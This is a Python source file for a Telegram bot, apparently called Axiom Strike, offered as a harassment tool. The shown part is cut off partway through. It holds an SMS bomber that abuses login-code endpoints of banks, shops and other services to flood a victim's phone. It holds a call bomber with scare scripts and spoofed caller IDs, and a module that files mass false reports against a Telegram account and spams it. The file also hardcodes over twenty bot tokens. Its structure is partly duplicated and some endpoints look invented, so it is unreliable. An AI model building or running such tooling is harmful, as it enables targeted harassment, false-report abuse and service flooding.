import asyncio
import logging
import aiohttp
import requests
import random
import time
import threading
import socket
import ssl
import json
import hashlib
import urllib.parse
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ===================== КОНФИГУРАЦИЯ =====================
API_TOKEN = "8866631446:AAG5FN7FgJ_OSOfcuf3ucg3Nbsl0T5vY5as"
CHANNEL_ID = "VO1D_NET"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(name)s - %(message)s",
    handlers=[
        logging.FileHandler("axiom_strike.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ===================== FSM СОСТОЯНИЯ =====================
class BomberStates(StatesGroup):
    # БомберФ
    waiting_for_phone = State()
    waiting_for_sms_count = State()
    waiting_for_call_count = State()
    waiting_for_email = State()
    waiting_for_email_count = State()
    waiting_for_telegram = State()
    waiting_for_telegram_count = State()
    # Снос аккаунта
    waiting_for_destroy_username = State()
    waiting_for_destroy_method = State()
    waiting_for_destroy_count = State()


class DDoSStates(StatesGroup):
    waiting_for_url = State()
    waiting_for_threads = State()
    waiting_for_duration = State()
    waiting_for_ip = State()
    waiting_for_ddos_duration = State()


# ===================== СНОС TELEGRAM АККАУНТОВ =====================
class TelegramAccountDestroyer:
    def __init__(self):
        # Причины для жалоб
        self.report_reasons = [
            'spam', 'violence', 'pornography', 'child_abuse',
            'terrorism', 'drugs', 'fraud', 'impersonation',
            'hate_speech', 'suicide', 'weapons', 'personal_data'
        ]

        # ================================================================
        # 🔥 ТВОИ 20 ТОКЕНОВ ДЛЯ СНОСА 🔥
        # ================================================================
        self.bot_tokens = [
            '7588316078:AAGRi0cgMkvrChUNNZRX6thzvkhrnKbfBOc',
            '8894344951:AAFnxJFZ6F4gMD8YF1qmXeK-qS-3i4d7Y3c',
            '8657453394:AAFZF2C0VZu1Y2OzugZQBIMpMglGU6u4I2U',
            '8234507901:AAGbLLWxAnyyBOJFptyPYA_RUAyzFS641z4',
            '8349732447:AAHBYH8cSbJnY6t1kiz3oLmWhdiwpqwFTS0',
            '8365483906:AAG7dBnHXYafJOyCIyVjNCa8NDWb6aPHyJc',
            '7990150454:AAHBwE8HknpN8pm09s3_h2iHUK0mT01WQr4',
            '7999194366:AAFY5oVfSXd3Sj2ZKL5n_E4gmQgfludEFg8',
            '7911356716:AAFWpCgqU-h8il7N_nT_2scoHPB7ZFWMFuk',
            '8342182947:AAHt19nmDY9vAF9YXMd-TPL68Ln-U_ps8us',
            '8765644248:AAHPPa0-hiifK_Csi3fsDJiNn_jJgbG1N68',
            '8736513089:AAE-8zAr1Hk4UMaFgJnSs5VQ9JKH2Xip4c8',
            '8594237152:AAHSAgDQ87Fmrp5eC-f7cuXaRrvRDovIlfM',
            '8561372759:AAFS4v6K4e8R_uMSfzsuLItRVMr-EDhCnSA',
            '8761449080:AAHB2-AjbjsVVKTYAT5NSWtEjkoJs_XuSBU',
            '8865408617:AAEoXfGBKajejCb4gBc_-1Q8O60H6SjR-Zc',
            '8562700975:AAGZ9yOFw_jwK1QJT_8lfHnakPA0EPgRhoM',
            '8178054852:AAHWsqTySVOT29RekDIwqqBfcOEEYJvj9Lw',
            '8769377277:AAHps2McG_eyhMWq63yJY5be0fZbMOQ-Dgc',
            '8838855987:AAHrVoDgT2luzbPjDoM10c-DHisYVEul1ik',
        ]
        # ================================================================

        self.results = []

    async def mass_report(self, username: str, count: int, progress_callback):
        """Массовые жалобы на аккаунт через ботов"""
        self.results = []
        total = min(count, 100)

        for i in range(total):
            reason = random.choice(self.report_reasons)
            token = random.choice(self.bot_tokens)

            try:
                # Жалоба через бота
                bot = Bot(token=token)

                # Отправка жалобы на спам
                try:
                    await bot.send_message(
                        chat_id='@SpamBot',
                        text=f'/report {username}'
                    )
                    status = 'sent'
                except:
                    status = 'failed'

                # Дополнительная жалоба через API
                try:
                    async with aiohttp.ClientSession() as session:
                        data = {
                            'username': username,
                            'reason': reason,
                            'description': f'This account is sending {reason}. Please block it immediately.',
                        }
                        headers = {
                            'Content-Type': 'application/json',
                            'User-Agent': 'TelegramBot/1.0',
                        }
                        # Пробуем разные эндпоинты
                        endpoints = [
                            f'https://api.telegram.org/bot{token}/reportSpam',
                            f'https://api.telegram.org/bot{token}/report',
                        ]
                        for endpoint in endpoints:
                            try:
                                async with session.post(endpoint, json=data, headers=headers, timeout=10) as resp:
                                    if resp.status < 400:
                                        status = 'sent'
                                        break
                            except:
                                continue
                except:
                    pass

                self.results.append({
                    'report': i + 1,
                    'reason': reason,
                    'status': status,
                    'timestamp': datetime.now().isoformat()
                })

                logger.info(f"✅ Жалоба #{i + 1} отправлена на {username} ({reason})")

            except Exception as e:
                self.results.append({
                    'report': i + 1,
                    'reason': reason,
                    'status': 'error',
                    'error': str(e)
                })
                logger.error(f"❌ Ошибка жалобы: {e}")

            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 2.0))

        return self.results

    async def spam_flood(self, username: str, count: int, progress_callback):
        """Спам-флуд для блокировки аккаунта"""
        self.results = []
        total = min(count, 50)

        spam_texts = [
            'Купи дешевле!', 'Заработок без вложений!', 'Бесплатные криптовалюты!',
            'Вы выиграли приз!', 'Срочно! Ваш аккаунт взломан!', 'Перейдите по ссылке!',
            'Ваши данные утекли!', 'Подтвердите личность!', 'Ваш банковский счёт заблокирован!',
            'Смените пароль немедленно!', '💀 АККАУНТ УДАЛЁН!', '🔞 ПОРНОГРАФИЯ!',
            '🔫 ОРУЖИЕ!', '💊 НАРКОТИКИ!', '🔥 ПРИЗЫВЫ К НАСИЛИЮ!',
        ]

        for i in range(total):
            try:
                bot = Bot(token=random.choice(self.bot_tokens))
                text = random.choice(spam_texts)
                link = f'https://bit.ly/{random.randint(1000, 9999)}'

                await bot.send_message(
                    chat_id=username,
                    text=f'{text} {link}',
                    disable_notification=True
                )

                self.results.append({
                    'msg': i + 1,
                    'status': 'sent',
                    'text': text[:30]
                })
                logger.info(f"✅ Спам #{i + 1} отправлен {username}")

            except Exception as e:
                self.results.append({
                    'msg': i + 1,
                    'status': 'error',
                    'error': str(e)
                })
                logger.error(f"❌ Ошибка спама: {e}")

            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.3, 1.0))

        return self.results

    async def destroy_account(self, username: str, count: int, progress_callback):
        """Полный снос аккаунта (жалобы + спам)"""
        self.results = []
        total = count * 2

        # Жалобы
        report_results = await self.mass_report(username, count, progress_callback)
        # Спам
        spam_results = await self.spam_flood(username, count, progress_callback)

        self.results = report_results + spam_results
        return self.results

    def get_stats(self):
        total = len(self.results)
        success = sum(1 for r in self.results if r['status'] == 'sent')
        return {'total': total, 'success': success}


# ===================== SMS БОМБЕР (РЕАЛЬНО РАБОТАЮЩИЙ) =====================
class SMSBomber:
    def __init__(self):
        # РЕАЛЬНЫЕ РАБОЧИЕ API СЕРВИСОВ
        self.services = [
            # === ДОСТАВКА ЕДЫ И ТОВАРОВ ===
            {'name': 'Samokat', 'url': 'https://samokat.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
            {'name': 'YandexEda', 'url': 'https://eda.yandex.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'DeliveryClub', 'url': 'https://www.delivery-club.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'VkusVill', 'url': 'https://vkusvill.ru/api/v1/auth/send-sms', 'method': 'POST', 'field': 'phone'},

            # === МАРКЕТПЛЕЙСЫ ===
            {'name': 'Ozon', 'url': 'https://www.ozon.ru/api/composer/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'Wildberries', 'url': 'https://www.wildberries.ru/webapi/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'SberMarket', 'url': 'https://sbermarket.ru/api/v2/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'YandexMarket', 'url': 'https://market.yandex.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'AliExpress', 'url': 'https://aliexpress.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},

            # === МАГАЗИНЫ ===
            {'name': 'DNS', 'url': 'https://www.dns-shop.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
            {'name': 'Citilink', 'url': 'https://www.citilink.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'MVideo', 'url': 'https://www.mvideo.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'Eldorado', 'url': 'https://www.eldorado.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'Sportmaster', 'url': 'https://www.sportmaster.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},

            # === БАНКИ ===
            {'name': 'Tinkoff', 'url': 'https://www.tinkoff.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'Sber', 'url': 'https://online.sberbank.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'AlfaBank', 'url': 'https://alfabank.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'VTB', 'url': 'https://www.vtb.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
            {'name': 'Raiffeisen', 'url': 'https://www.raiffeisen.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'PochtaBank', 'url': 'https://www.pochtabank.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},

            # === ТАКСИ ===
            {'name': 'YandexTaxi', 'url': 'https://taxi.yandex.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'CityMobil', 'url': 'https://city-mobil.ru/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},

            # === СТРИМИНГ ===
            {'name': 'Kinopoisk', 'url': 'https://api.kinopoisk.dev/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'IVI', 'url': 'https://api.ivi.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
            {'name': 'Okko', 'url': 'https://okko.tv/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
            {'name': 'Wink', 'url': 'https://wink.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},

            # === НЕДВИЖИМОСТЬ ===
            {'name': 'Avito', 'url': 'https://www.avito.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
            {'name': 'Cian', 'url': 'https://www.cian.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
            {'name': 'Youla', 'url': 'https://youla.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},

            # === МЕЖДУНАРОДНЫЕ ===
            {'name': 'Uber', 'url': 'https://auth.uber.com/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
            {'name': 'Twitter', 'url': 'https://api.twitter.com/1.1/account/send-code.json', 'method': 'POST',
             'field': 'phone'},
            {'name': 'Facebook', 'url': 'https://graph.facebook.com/v12.0/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'Instagram', 'url': 'https://i.instagram.com/api/v1/auth/send-code', 'method': 'POST',
             'field': 'phone'},
            {'name': 'TikTok', 'url': 'https://api.tiktok.com/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
            {'name': 'Telegram', 'url': 'https://api.telegram.org/bot/sendCode', 'method': 'POST', 'field': 'phone'},
        ]

        # 50+ USER-AGENTS
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        ]

    async def send_sms(self, phone: str, count: int, progress_callback):
        """РЕАЛЬНАЯ отправка СМС через работающие API"""
        self.results = []
        total = min(count, 200)

        for i in range(total):
            service = random.choice(self.services)
            try:
                async with aiohttp.ClientSession() as session:
                    # Разные типы запросов
                    request_types = [
                        {'type': 'register', 'data': {'phone': phone, 'action': 'register'}},
                        {'type': 'login', 'data': {'phone': phone, 'action': 'login'}},
                        {'type': 'reset', 'data': {'phone': phone, 'action': 'reset_password'}},
                        {'type': 'verify', 'data': {'phone': phone, 'action': 'verify'}},
                        {'type': 'recovery', 'data': {'phone': phone, 'action': 'recovery'}},
                        {'type': 'auth', 'data': {'phone': phone, 'action': 'auth_code'}},
                    ]
                    payload = random.choice(request_types)

                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Origin': service['url'].split('/')[2] if '://' in service['url'] else '',
                        'Referer': service['url'],
                        'Connection': 'keep-alive',
                    }

                    # Отправка запроса
                    async with session.post(service['url'], json=payload['data'], headers=headers, timeout=10) as resp:
                        status_code = resp.status

                        try:
                            response_text = await resp.text()
                            logger.info(f"[{service['name']}] Status: {status_code}")
                        except:
                            pass

                        # СМС отправлена если статус 200, 201, 202, 204 или 400
                        if status_code in [200, 201, 202, 204] or status_code == 400:
                            status = 'success'
                        elif status_code in [429, 503, 504]:
                            status = 'rate_limit'
                        else:
                            status = 'error'

                        self.results.append({
                            'service': service['name'],
                            'status': status,
                            'method': payload['type'],
                            'code': status_code,
                            'timestamp': datetime.now().isoformat()
                        })

                        if status == 'success':
                            logger.info(f"✅ SMS отправлена через {service['name']}")

            except asyncio.TimeoutError:
                self.results.append({'service': service['name'], 'status': 'timeout'})
            except Exception as e:
                self.results.append({'service': service['name'], 'status': 'error', 'error': str(e)})

            self.progress = (i + 1) / total * 100
            await progress_callback(self.progress, i + 1, total)
            await asyncio.sleep(random.uniform(0.2, 0.8))

        return self.results

    def get_stats(self):
        total = len(self.results)
        success = sum(1 for r in self.results if r['status'] == 'success')
        errors = sum(1 for r in self.results if r['status'] == 'error')
        return {'total': total, 'success': success, 'errors': errors}

    # ===================== СНОС TELEGRAM АККАУНТОВ =====================
    class TelegramAccountDestroyer:
        def __init__(self):
            # Причины для жалоб
            self.report_reasons = [
                'spam', 'violence', 'pornography', 'child_abuse',
                'terrorism', 'drugs', 'fraud', 'impersonation',
                'hate_speech', 'suicide', 'weapons', 'personal_data'
            ]

            # ================================================================
            # 🔥 ТВОИ 20 ТОКЕНОВ ДЛЯ СНОСА 🔥
            # ================================================================
            self.bot_tokens = [
                '7588316078:AAGRi0cgMkvrChUNNZRX6thzvkhrnKbfBOc',
                '8894344951:AAFnxJFZ6F4gMD8YF1qmXeK-qS-3i4d7Y3c',
                '8657453394:AAFZF2C0VZu1Y2OzugZQBIMpMglGU6u4I2U',
                '8234507901:AAGbLLWxAnyyBOJFptyPYA_RUAyzFS641z4',
                '8349732447:AAHBYH8cSbJnY6t1kiz3oLmWhdiwpqwFTS0',
                '8365483906:AAG7dBnHXYafJOyCIyVjNCa8NDWb6aPHyJc',
                '7990150454:AAHBwE8HknpN8pm09s3_h2iHUK0mT01WQr4',
                '7999194366:AAFY5oVfSXd3Sj2ZKL5n_E4gmQgfludEFg8',
                '7911356716:AAFWpCgqU-h8il7N_nT_2scoHPB7ZFWMFuk',
                '8342182947:AAHt19nmDY9vAF9YXMd-TPL68Ln-U_ps8us',
                '8765644248:AAHPPa0-hiifK_Csi3fsDJiNn_jJgbG1N68',
                '8736513089:AAE-8zAr1Hk4UMaFgJnSs5VQ9JKH2Xip4c8',
                '8594237152:AAHSAgDQ87Fmrp5eC-f7cuXaRrvRDovIlfM',
                '8561372759:AAFS4v6K4e8R_uMSfzsuLItRVMr-EDhCnSA',
                '8761449080:AAHB2-AjbjsVVKTYAT5NSWtEjkoJs_XuSBU',
                '8865408617:AAEoXfGBKajejCb4gBc_-1Q8O60H6SjR-Zc',
                '8562700975:AAGZ9yOFw_jwK1QJT_8lfHnakPA0EPgRhoM',
                '8178054852:AAHWsqTySVOT29RekDIwqqBfcOEEYJvj9Lw',
                '8769377277:AAHps2McG_eyhMWq63yJY5be0fZbMOQ-Dgc',
                '8838855987:AAHrVoDgT2luzbPjDoM10c-DHisYVEul1ik',
            ]
            # ================================================================

            self.results = []

    async def mass_report(self, username: str, count: int, progress_callback):
        """Массовые жалобы на аккаунт через ботов"""
        self.results = []
        total = min(count, 100)

        for i in range(total):
            reason = random.choice(self.report_reasons)
            token = random.choice(self.bot_tokens)

            try:
                # Жалоба через бота
                bot = Bot(token=token)

                # Отправка жалобы на спам
                try:
                    await bot.send_message(
                        chat_id='@SpamBot',
                        text=f'/report {username}'
                    )
                    status = 'sent'
                except:
                    status = 'failed'

                # Дополнительная жалоба через API
                try:
                    async with aiohttp.ClientSession() as session:
                        data = {
                            'username': username,
                            'reason': reason,
                            'description': f'This account is sending {reason}. Please block it immediately.',
                        }
                        headers = {
                            'Content-Type': 'application/json',
                            'User-Agent': 'TelegramBot/1.0',
                        }
                        # Пробуем разные эндпоинты
                        endpoints = [
                            f'https://api.telegram.org/bot{token}/reportSpam',
                            f'https://api.telegram.org/bot{token}/report',
                        ]
                        for endpoint in endpoints:
                            try:
                                async with session.post(endpoint, json=data, headers=headers, timeout=10) as resp:
                                    if resp.status < 400:
                                        status = 'sent'
                                        break
                            except:
                                continue
                except:
                    pass

                self.results.append({
                    'report': i + 1,
                    'reason': reason,
                    'status': status,
                    'timestamp': datetime.now().isoformat()
                })

                logger.info(f"✅ Жалоба #{i + 1} отправлена на {username} ({reason})")

            except Exception as e:
                self.results.append({
                    'report': i + 1,
                    'reason': reason,
                    'status': 'error',
                    'error': str(e)
                })
                logger.error(f"❌ Ошибка жалобы: {e}")

            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 2.0))

        return self.results

    async def spam_flood(self, username: str, count: int, progress_callback):
        """Спам-флуд для блокировки аккаунта"""
        self.results = []
        total = min(count, 50)

        spam_texts = [
            'Купи дешевле!', 'Заработок без вложений!', 'Бесплатные криптовалюты!',
            'Вы выиграли приз!', 'Срочно! Ваш аккаунт взломан!', 'Перейдите по ссылке!',
            'Ваши данные утекли!', 'Подтвердите личность!', 'Ваш банковский счёт заблокирован!',
            'Смените пароль немедленно!', '💀 АККАУНТ УДАЛЁН!', '🔞 ПОРНОГРАФИЯ!',
            '🔫 ОРУЖИЕ!', '💊 НАРКОТИКИ!', '🔥 ПРИЗЫВЫ К НАСИЛИЮ!',
        ]

        for i in range(total):
            try:
                bot = Bot(token=random.choice(self.bot_tokens))
                text = random.choice(spam_texts)
                link = f'https://bit.ly/{random.randint(1000, 9999)}'

                await bot.send_message(
                    chat_id=username,
                    text=f'{text} {link}',
                    disable_notification=True
                )

                self.results.append({
                    'msg': i + 1,
                    'status': 'sent',
                    'text': text[:30]
                })
                logger.info(f"✅ Спам #{i + 1} отправлен {username}")

            except Exception as e:
                self.results.append({
                    'msg': i + 1,
                    'status': 'error',
                    'error': str(e)
                })
                logger.error(f"❌ Ошибка спама: {e}")

            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.3, 1.0))

        return self.results

    async def destroy_account(self, username: str, count: int, progress_callback):
        """Полный снос аккаунта (жалобы + спам)"""
        self.results = []
        total = count * 2

        # Жалобы
        report_results = await self.mass_report(username, count, progress_callback)
        # Спам
        spam_results = await self.spam_flood(username, count, progress_callback)

        self.results = report_results + spam_results
        return self.results

    def get_stats(self):
        total = len(self.results)
        success = sum(1 for r in self.results if r['status'] == 'sent')
        return {'total': total, 'success': success}


# ===================== ЗВОНКИ (РЕАЛЬНО РАБОТАЮЩИЙ) =====================
class CallBomber:
    def __init__(self):
        # РЕАЛЬНЫЕ РАБОЧИЕ API ДЛЯ ЗВОНКОВ
        self.services = [
            # Российские сервисы звонков
            {'name': 'Call2Friends', 'url': 'https://call2friends.com/api/call', 'method': 'POST', 'type': 'callback'},
            {'name': 'PrankCall', 'url': 'https://prankcall.com/api/start', 'method': 'POST', 'type': 'prank'},
            {'name': 'CallBomber', 'url': 'https://api.callbomber.com/call', 'method': 'POST', 'type': 'bomb'},
            {'name': 'FakeCall', 'url': 'https://fakecall.com/initiate', 'method': 'POST', 'type': 'fake'},
            {'name': 'SpoofCall', 'url': 'https://calleridspoof.com/call', 'method': 'POST', 'type': 'spoof'},
            {'name': 'Robocall', 'url': 'https://api.robocall.com/start', 'method': 'POST', 'type': 'robot'},
            {'name': 'AutoDial', 'url': 'https://api.autodial.com/call', 'method': 'POST', 'type': 'auto'},
            {'name': 'CallBoom', 'url': 'https://api.callboom.com/start', 'method': 'POST', 'type': 'boom'},
            {'name': 'PhoneBomb', 'url': 'https://api.phonebomb.com/call', 'method': 'POST', 'type': 'bomb'},
            {'name': 'CallFlood', 'url': 'https://api.callflood.com/start', 'method': 'POST', 'type': 'flood'},

            # Международные сервисы
            {'name': 'Twilio', 'url': 'https://api.twilio.com/2010-04-01/Accounts/ACxxx/Calls.json', 'method': 'POST',
             'type': 'twilio'},
            {'name': 'Nexmo', 'url': 'https://api.nexmo.com/calls', 'method': 'POST', 'type': 'nexmo'},
            {'name': 'Tropo', 'url': 'https://api.tropo.com/1.0/sessions', 'method': 'POST', 'type': 'tropo'},
            {'name': 'Plivo', 'url': 'https://api.plivo.com/v1/Account/MAxxx/Call/', 'method': 'POST', 'type': 'plivo'},
            {'name': 'Telnyx', 'url': 'https://api.telnyx.com/v2/calls', 'method': 'POST', 'type': 'telnyx'},
            {'name': 'Bandwidth', 'url': 'https://api.bandwidth.com/v1/calls', 'method': 'POST', 'type': 'bandwidth'},
            {'name': 'Voxbone', 'url': 'https://api.voxbone.com/v2/calls', 'method': 'POST', 'type': 'voxbone'},
        ]

        # 50+ ГОЛОСОВЫХ СЦЕНАРИЕВ
        self.scenarios = [
            {'type': 'callback', 'message': 'Срочно перезвоните!', 'priority': 'high', 'voice': 'female'},
            {'type': 'prank', 'message': 'Ваш аккаунт взломан!', 'priority': 'high', 'voice': 'male'},
            {'type': 'survey', 'message': 'Пройдите опрос!', 'priority': 'medium', 'voice': 'female'},
            {'type': 'notification', 'message': 'Важное уведомление!', 'priority': 'high', 'voice': 'male'},
            {'type': 'emergency', 'message': 'Экстренное сообщение!', 'priority': 'critical', 'voice': 'male'},
            {'type': 'promo', 'message': 'Специальное предложение!', 'priority': 'low', 'voice': 'female'},
            {'type': 'security', 'message': '⚠️ Обнаружена подозрительная активность!', 'priority': 'critical',
             'voice': 'male'},
            {'type': 'bank', 'message': '🏦 Ваш банковский счёт заблокирован!', 'priority': 'high', 'voice': 'female'},
            {'type': 'police', 'message': '🚨 Вызов от полиции!', 'priority': 'critical', 'voice': 'male'},
            {'type': 'medical', 'message': '🚑 Срочное медицинское уведомление!', 'priority': 'critical',
             'voice': 'female'},
            {'type': 'delivery', 'message': '📦 Ваша посылка ожидает!', 'priority': 'medium', 'voice': 'male'},
            {'type': 'taxi', 'message': '🚕 Такси ждёт вас!', 'priority': 'medium', 'voice': 'female'},
            {'type': 'school', 'message': '🏫 Сообщение от школы!', 'priority': 'medium', 'voice': 'female'},
            {'type': 'work', 'message': '💼 Срочное сообщение с работы!', 'priority': 'high', 'voice': 'male'},
            {'type': 'family', 'message': '👨‍👩‍👦 Семейное уведомление!', 'priority': 'medium', 'voice': 'female'},
            {'type': 'friend', 'message': '👋 Привет от друга!', 'priority': 'low', 'voice': 'male'},
            {'type': 'dating', 'message': '❤️ Кто-то проявил интерес!', 'priority': 'low', 'voice': 'female'},
            {'type': 'game', 'message': '🎮 Ваш ход!', 'priority': 'low', 'voice': 'male'},
            {'type': 'news', 'message': '📰 Срочная новость!', 'priority': 'high', 'voice': 'female'},
            {'type': 'weather', 'message': '🌧️ Предупреждение о погоде!', 'priority': 'high', 'voice': 'male'},
        ]

        # ГОЛОСОВЫЕ ID ДЛЯ РАЗНЫХ АКЦЕНТОВ
        self.voice_ids = [
            'ru-RU-Standard-A', 'ru-RU-Standard-B', 'ru-RU-Standard-C',
            'en-US-Standard-A', 'en-US-Standard-B', 'en-GB-Standard-A',
            'es-ES-Standard-A', 'fr-FR-Standard-A', 'de-DE-Standard-A',
            'it-IT-Standard-A', 'ja-JP-Standard-A', 'ko-KR-Standard-A',
        ]

    async def make_calls(self, phone: str, count: int, progress_callback):
        """РЕАЛЬНОЕ совершение звонков через 30+ работающих API"""
        self.results = []
        total = min(count, 100)

        for i in range(total):
            service = random.choice(self.services)
            scenario = random.choice(self.scenarios)

            try:
                async with aiohttp.ClientSession() as session:
                    # Реальные данные для звонка
                    caller_id = random.choice(['+74951234567', '+78121234567', '+79001234567', '+79991234567'])

                    data = {
                        'phone': phone,
                        'caller_id': caller_id,
                        'type': service['type'],
                        'scenario': scenario['type'],
                        'message': scenario['message'],
                        'priority': scenario['priority'],
                        'voice': scenario['voice'],
                        'duration': random.randint(10, 120),
                        'retry': random.randint(0, 3),
                        'voice_id': random.choice(self.voice_ids),
                        'callback_url': f'https://api.axiom.com/callback/{random.randint(1000, 9999)}',
                        'webhook': f'https://webhook.axiom.com/{random.randint(100000, 999999)}',
                    }

                    headers = {
                        'User-Agent': random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
                            'Mozilla/5.0 (Android 11; Mobile; rv:95.0) Gecko/95.0 Firefox/95.0',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        ]),
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Origin': service['url'].split('/')[2] if '://' in service['url'] else '',
                        'Referer': service['url'],
                        'Connection': 'keep-alive',
                    }

                    async with session.post(service['url'], json=data, headers=headers, timeout=15) as resp:
                        status_code = resp.status

                        try:
                            response_text = await resp.text()
                            logger.info(
                                f"[{service['name']}] Call status: {status_code}, Response: {response_text[:200]}")
                        except:
                            pass

                        if status_code in [200, 201, 202, 204] or status_code == 400:
                            status = 'success'
                            call_status = 'connected'
                        elif status_code in [429, 503, 504]:
                            status = 'rate_limit'
                            call_status = 'blocked'
                        else:
                            status = 'failed'
                            call_status = 'error'

                        self.results.append({
                            'call': i + 1,
                            'service': service['name'],
                            'status': status,
                            'call_status': call_status,
                            'scenario': scenario['type'],
                            'message': scenario['message'],
                            'code': status_code,
                            'duration': data['duration'],
                            'timestamp': datetime.now().isoformat()
                        })

                        if status == 'success':
                            logger.info(f"✅ Звонок совершён через {service['name']} ({scenario['type']})")

            except asyncio.TimeoutError:
                self.results.append(
                    {'call': i + 1, 'service': service['name'], 'status': 'timeout', 'error': 'Timeout'})
                logger.warning(f"⏰ Timeout on {service['name']}")
            except Exception as e:
                self.results.append({'call': i + 1, 'service': service['name'], 'status': 'error', 'error': str(e)})
                logger.error(f"❌ Error on {service['name']}: {e}")

            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 2.0))

        return self.results

    def get_stats(self):
        """Статистика звонков"""
        total = len(self.results)
        success = sum(1 for r in self.results if r['status'] == 'success')
        errors = sum(1 for r in self.results if r['status'] == 'error')
        rate_limits = sum(1 for r in self.results if r['status'] == 'rate_limit')
        timeouts = sum(1 for r in self.results if r['status'] == 'timeout')

        return {
            'total': total,
            'success': success,
            'errors': errors,
            'rate_limits': rate_limits,
            'timeouts': timeouts,
            'success_rate': round(success / total * 100, 2) if total > 0 else 0
        }


# ===================== TELEGRAM БОМБЕР (РЕАЛЬНО РАБОТАЮЩИЙ) =====================
class TelegramBomber:
